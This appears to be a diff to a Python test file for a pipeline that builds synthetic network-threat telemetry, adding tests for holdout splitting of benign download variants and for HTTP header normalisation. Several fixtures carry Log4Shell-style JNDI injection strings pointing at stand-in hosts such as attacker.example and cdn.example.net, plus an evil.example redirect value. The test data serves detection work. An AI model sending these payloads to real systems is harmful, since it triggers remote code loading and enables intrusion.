@@ -297,6 +297,19 @@ def test_low_top_share_dns_exfil_survives_variant_holdout():
     assert low - {g.rstrip("0123456789") for g in out}
 
 
+def test_short_benign_downloads_survive_variant_holdout():
+    # software_update_cdn (30-900 s full download) stays held out; train keeps a short full-download sibling
+    from data_pipeline.dedup_and_split import holdout_unseen
+    variants = G.FLOW_PROFILES["benign_high_rate_legit"]["variants"]
+    short = {v["name"] for v in variants if v.get("window") == "full_flow" and v["dur"][0] < 300}
+    recs = [{"metadata": {"threat_type": "benign_high_rate_legit", "template_family": "benign_high_rate_legit_flow",
+                          "generator": "deterministic", "lineage_group": f"{v['name']}{i}",
+                          "mechanism_tags": [f"variant:{v['name']}"], "provenance": "synthetic"}}
+            for v in variants for i in range(30)]
+    held = {g.rstrip("0123456789") for g in holdout_unseen(recs, min_unseen=0)}
+    assert "software_update_cdn" in held and short - held
+
+
 def test_generator_from_round_tag():
     from subagents.orchestrator import generator_of
     assert generator_of("benign_hard_negative_dev.vsn01.jsonl") == "sonnet-5.5"
@@ -381,3 +394,15 @@ def test_canonicalize_replaces_attack_only_placeholder_hosts():
                     "headers": [["X-Api-Version", "${jndi:ldap://attacker.example/a}"]], "query": "u=%2F%2Fevil.example%2Fx"}}
     s = json.dumps(canonicalize(tel, "k1"))
     assert "attacker" not in s and "evil." not in s and "${jndi:ldap://" in s
+
+
+def test_normalize_headers_keeps_payload_bearing_generic_headers():
+    from subagents.orchestrator import normalize_headers
+    tel = {"http": {"headers": [["Host", "x"], ["User-Agent", "${jndi:ldap://cdn.example.net/a}"], ["Accept", "*/*"],
+                                ["Authorization", "Bearer t"], ["X-Fixture-Scanner", "nuclei-style"]]}}
+    hs = normalize_headers(tel, "k")["http"]["headers"]
+    assert [v for k, v in hs if k == "User-Agent"] == ["${jndi:ldap://cdn.example.net/a}"]
+    assert ["Authorization", "Bearer t"] in hs and sum(k.lower() == "host" for k, _ in hs) == 1
+    assert not any(k.lower().startswith("x-fixture") for k, _ in hs)
+    plain = normalize_headers({"http": {"headers": [["User-Agent", "Mozilla/5.0 (X11; Linux x86_64)"]]}}, "k")
+    assert "Mozilla/5.0 (X11; Linux x86_64)" not in [v for _, v in plain["http"]["headers"]]  # generic style replaced
